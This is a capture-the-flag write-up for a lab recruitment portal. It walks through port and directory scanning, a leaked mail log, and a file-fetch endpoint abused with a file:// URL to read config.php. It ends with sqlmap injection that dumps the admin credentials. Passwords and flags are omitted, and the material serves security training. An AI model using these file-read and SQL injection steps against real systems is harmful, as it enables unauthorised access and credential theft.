## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```bash
**Recruit** has just launched its new recruitment portal, allowing HR staff to manage candidate applications and administrators to oversee hiring decisions. While the platform appears functional, management suspects that security may have been overlooked during development. Your task is to assess the application like a real attacker, mapping its structure, abusing exposed functionality, and exploiting vulnerabilities.

Can you gain an initial foothold, escalate your access, and ultimately log in as the **administrator?**
```
## IP-Address
```bash
10.49.131.109
```
## Enumeration
- Port Scanning 
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 5f:97:01:b5:3a:02:a5:71:5b:c8:cf:c8:51:03:16:05 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFZzrdFxglo5QREEAl4UXYzbMj0Q/iTtHPLw7DMxnWdXNwvJWvShIcs9PF/x5vW/X+Ux8etnyKC9JnTk1Se9vGL5cqC7ZdcpzFGQsTLdRAOi5Mp5T6665XswXYnKacngl10l2Ifcw4kGD7H4otoU/OJn4gQ6O9/KW54CNrxac6AODQf4GwTj/7G5SeXrSk7aPgqS9Oxjyr2Yv5GShdimhyGjzlKrhdv5DiEwGq0SXDdpu8PonQBjC91trckdqxI39OHu//Rk5fLAA22UiC5wTgBrcCQEi5cVVgtpTz2qgXdgyoqT+KLJJNMtDb6DR2iy6FjXhP+Ar7pk2hPxFq6f/gCs8YyzzaVzRQuVo6kVEXGDCcaNGKZzgn1qX6pB+OH2Z/uOpBERWsRkawSgh7L8Iv9s7u9LFZtOTOAMhINhUpaqcy0idOYZS1lf0C5xVgF73F+0IYx+szqJXeK2/1LIuW6sQu+g7bNtMYlU0nu+PkIQpnObGPslgnsuJomtgLRXs=
|   256 ea:86:74:6b:57:a6:67:32:32:41:a7:fc:67:01:80:ff (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHqRvZgqLV0tdles8Ne+PrR25Y3JPPJRWD2TGTLyX3J1l+zMDdApkfVBqIlvB5mddIx+HUtpP7KUBiU/qWVVc5A=
|   256 a8:47:5d:d7:83:11:b6:e5:e8:0e:e9:37:7f:d3:11:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJHxYH7Pt29DYE7YKHV5chxU7dMhckEEE15FT1uIa05U
53/tcp open  domain  syn-ack ttl 62 ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Recruit
```
----
### Web-Enumeration
- Login Page
```html
<div class="accordion-body">
         You can fetch a candidate CV using the following endpoint:
          <pre class="mt-2"><code>/file.php?cv=&lt;URL&gt;</code></pre>
</div>
```
- Hidden Directory
```bash
$ gobuster dir -u http://10.49.187.41 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.187.41
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 277]
.htpasswd            (Status: 403) [Size: 277]
.hta                 (Status: 403) [Size: 277]
assets               (Status: 301) [Size: 313] [--> http://10.49.187.41/assets/]
index.php            (Status: 200) [Size: 1417]
javascript           (Status: 301) [Size: 317] [--> http://10.49.187.41/javascript/]
mail                 (Status: 301) [Size: 311] [--> http://10.49.187.41/mail/]
phpmyadmin           (Status: 301) [Size: 317] [--> http://10.49.187.41/phpmyadmin/]
server-status        (Status: 403) [Size: 277]
sitemap.xml          (Status: 200) [Size: 1710]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```
- UseFul Web-pages
```bash
- /sitemap.xml
- /mail
  - Mai.log

```
- Mail.log
```html
May 14 09:32:11 recruit-server postfix/smtpd[2143]: connect from hr-workstation.local[10.10.5.23]
May 14 09:32:12 recruit-server postfix/smtpd[2143]: 4F1A2203F: client=hr-workstation.local[10.10.5.23]
May 14 09:32:13 recruit-server postfix/cleanup[2146]: 4F1A2203F: message-id=<20240514093213.4F1A2203F@recruit.local>
May 14 09:32:13 recruit-server postfix/qmgr[1789]: 4F1A2203F: from=<hr@recruit.thm>, size=1824, nrcpt=1 (queue active)
May 14 09:32:14 recruit-server postfix/local[2151]: 4F1A2203F: to=<it-support@recruit.local>, relay=local, delay=0.34, status=sent

------------------------------------------------------------
From: HR Team <hr@recruit.thm>
To: IT Support <it-support@recruit.thm>
Date: Tue, 14 May 2024 09:32:10 +0000
Subject: Recruitment Portal Deployment Confirmation

Hi Team,

Just a quick update to confirm that the new Recruitment Portal
has been deployed successfully and is functioning as expected.

Weâ€™ve completed basic validation:
- Login page is accessible
- Candidate dashboard loads correctly
- API documentation page is live

As discussed during deployment:
- HR login credentials (username: hr) are currently stored in the application
  configuration file (config.php) for ease of access during
  the initial rollout phase.
- Administrator credentials are NOT stored in the application
  files and are securely maintained within the backend database.

Please let us know if there are any issues or if further changes
are required.

Thanks,
HR Operations
Recruitment Team
------------------------------------------------------------

May 14 09:32:14 recruit-server postfix/qmgr[1789]: 4F1A2203F: removed
```
- Found Endpoint
```php
- GET //file.php?cv=file://config.php
<?php
/*
|--------------------------------------------------------------------------
| Application Configuration
|--------------------------------------------------------------------------
*/
$APP_NAME        = 'Recruit';
$APP_ENV         = 'production';
$APP_VERSION     = '1.2.4';
$APP_DEBUG       = false;
/*
|--------------------------------------------------------------------------
| HR Credentials (Temporary – Initial Rollout Phase)
|--------------------------------------------------------------------------
| NOTE:
| These credentials are stored here temporarily for ease of access
| during the initial deployment and will be moved to the database
| in a future release.
*/
$HR_PASSWORD = '[password omitted]';
/*
|--------------------------------------------------------------------------
| API Configuration
|--------------------------------------------------------------------------
*/
$API_ENABLED     = true;
$API_VERSION     = 'v1';
?>
```

----
### creds
```Creds
username - hr
Password - [password omitted]
```
### HR Flag
```Flag
[flag omitted]
```
---
### Privilege Escalation
- Got New End-point
```enpoint
GET /dashboard.php?search=%27 HTTP/1.1
Host: 10.49.146.34
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.8
Referer: http://10.49.146.34/dashboard.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=gpfh99adj9uie1jt99s69hb1fm
Connection: keep-alive
```
- SQL Map to infiltrate `backend`
```bash
─$ sqlmap -r req.txt --dbs
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] recruit_db
[*] sys

$ sqlmap -r req.txt -D recruit_db --dump-all

+----+----------------+----------+
| id | password       | username |
+----+----------------+----------+
| 1  | [password omitted] | admin    |
+----+----------------+----------+
```
-----
## ROOT Flag

```flag
[flag omitted]
```

# END